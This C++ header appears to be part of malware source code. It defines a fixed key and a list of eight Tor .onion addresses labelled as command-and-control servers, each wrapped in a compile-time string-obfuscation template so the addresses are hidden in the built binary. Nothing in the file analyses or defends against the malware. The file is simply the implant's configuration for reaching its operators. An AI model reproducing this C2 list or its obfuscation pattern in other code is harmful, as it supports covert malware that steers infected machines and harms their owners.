#pragma once
#include "crypto/obfuscation/o_string.h"

constexpr char key[9] = "abcdefgh";

constexpr o_string<63, key, 8> c2_address_list[8] = {
	o_string<63, key, 8>("franc2bjcksvhbnv2r4u6c47sbopkkp6moblq6u3xylaskgernhidbyd.onion"),
	o_string<63, key, 8>("franc2cauqdmy4t6bydznrb67zi4bj44qtjie4lm7c2qlr2tr6licoad.onion"),
	o_string<63, key, 8>("franc2cimv6m3c2hsievp7drrftxxmorx5wzqb4h4cndf2pmndznsryd.onion"),
	o_string<63, key, 8>("franc2h67nfv7oc3im64gy7nhvifuqibrd4wkknjlfwvbnzpbfn5hgad.onion"),
	o_string<63, key, 8>("franc2o6khlzkbixuoags4hia7aie4yp5uys5c4f6ar6yqjh4jpw7lad.onion"),
	o_string<63, key, 8>("franc2rad4mjch7u4zujxq4qgwaow7ywo4mptx3uvdxnlphjbu5esfyd.onion"),
	o_string<63, key, 8>("franc2yupyeiw7u4ljkgayvxydeqguslpd5t6g6zxyl7dloadoczj2yd.onion"),
	o_string<63, key, 8>("franc25dqs53ycrpthqzmf6da53r5yd7w6pmaugivcpc24wbok3kkpqd.onion")
};